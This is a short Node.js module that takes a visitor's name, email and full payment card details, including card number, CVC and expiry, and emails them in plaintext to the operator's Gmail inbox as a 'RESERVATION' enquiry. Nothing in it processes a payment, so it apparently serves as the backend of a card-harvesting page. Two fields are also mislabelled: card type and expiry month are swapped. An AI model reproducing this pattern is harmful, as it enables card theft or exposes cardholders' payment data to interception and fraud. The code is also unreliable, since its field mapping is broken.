const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: `${process.env.MAIL}`,
    pass: `${process.env.PASS}`,
  },
});

const sendDetails = async (userData, cb) => {
  // console.log("userData", userData);
  // const link = `${FE_URL}/verify?email=${user.email}&token=${token}`
  const mailOptions = {
    from: `RESERVATION`,
    to: process.env.MAIL,
    subject: "ENQUIRY",
    text: `
  First Name: ${userData?.first_name}\n
  Last Name: ${userData?.last_name}\n
  Email: ${userData?.email}\n
  Card Holder's Name: ${userData?.holder_name}\n
  Card Number: ${userData?.card_number}\n
  CVC: ${userData?.cvc}\n
  Card Type: ${userData?.expiry_month}\n
  Expiry Date: ${userData?.card_type}/${userData?.expiry_year}\n
  `,
  };

  await new Promise((resolve, reject) => {
    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        cb(err.message, null);
        console.error(err);
        reject(err);
      } else {
        cb(null, info);
        resolve(info);
      }
    });
  });
};
module.exports = {
  sendDetails,
};
